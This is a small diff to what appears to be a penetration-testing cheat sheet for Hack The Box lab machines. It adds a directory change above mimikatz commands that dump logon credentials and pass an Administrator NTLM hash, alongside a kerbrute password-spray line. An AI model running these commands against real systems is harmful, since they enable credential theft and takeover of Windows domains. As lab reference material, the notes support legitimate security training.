@@ -412,6 +412,8 @@ kerbrute passwordspray ./userlist Password123! -dc 10.10.10.248 -d active.htb
 ```
 ### mimikatz
 ```powershell
+cd /opt/mimikatz/x64
+
 # PTH
 .\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
 .\mimikatz.exe "privilege::debug" "sekurlsa::pth /user:Administrator /domain:htb.local /ntlm:cc36cf7a8514893efccd332446158b1a" "exit"
